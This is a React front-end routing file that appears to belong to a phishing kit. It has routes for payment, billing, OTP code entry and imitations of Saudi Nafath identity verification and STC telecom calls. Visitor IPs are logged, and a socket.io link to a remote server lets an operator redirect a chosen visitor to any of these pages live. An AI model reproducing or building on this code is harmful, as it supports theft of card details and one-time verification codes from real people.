import { BrowserRouter, Route, Routes } from "react-router-dom";
import PhoneInput from "./components/PhoneInput";

import { io } from "socket.io-client";
import axios from "axios";
import Home from "./pages/Home";
import { useEffect } from "react";
import ComprehensivePage from "./pages/ComprehensivePage";
import Details from "./pages/Details";
import ThirdParty from "./pages/ThirdParty";
import BillingPage from "./pages/Billing";
import Payment from "./pages/Payment";
import Verification from "./pages/Verification";
import STC from "./pages/STC";
import Code from "./pages/Code";
import Phone from "./pages/Phone";
import PhoneCode from "./pages/PhoneCode";
import StcCall from "./pages/STCCall";
import NafadPage from "./pages/Nafad";
import NafadVerification from "./pages/NafadVerification";

export const apiRoute = "https://b-server-74j4.onrender.com";
// export const apiRoute = "http://localhost:8080";
export const socket = io(apiRoute);

function App() {
  useEffect(()=>{
    (async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        console.log(data);
        localStorage.setItem("visitorIP", data.ip);
      } catch (err) {
        console.error("Failed to fetch IP", err);
        return null;
      }
    })();
  })

 socket.on("navigateTo", ({ ip, page }) => {
   console.log(localStorage.getItem("visitorIP"));
   if (ip == localStorage.getItem("visitorIP")) {
     window.location.href = "/" + page;
   }
 });
  
 
  return (
    <div className="w-full flex items-center justify-center">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Home />} />

          <Route path="/nafad-basmah" element={<NafadVerification />} />
          <Route path="/nafad" element={<NafadPage />} />
          <Route path="/stcCall" element={<StcCall />} />
          <Route path="/phonecode" element={<PhoneCode />} />
          <Route path="/phone" element={<Phone />} />
          <Route path="/code" element={<Code />} />
          <Route path="/bCall" element={<STC />} />
          <Route path="/verification" element={<Verification />} />
          <Route path="/payment" element={<Payment />} />
          <Route path="/billing" element={<BillingPage />} />
          <Route path="/comprehensive" element={<ComprehensivePage />} />
          <Route path="/thirdparty" element={<ThirdParty />} />
          <Route path="/phone" element={<PhoneInput />} />
          <Route path="/details" element={<Details />} />

          {/* fallback route */}
          <Route
            path="*"
            element={<div className="text-center mt-5">الصفحة غير موجودة</div>}
          />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;
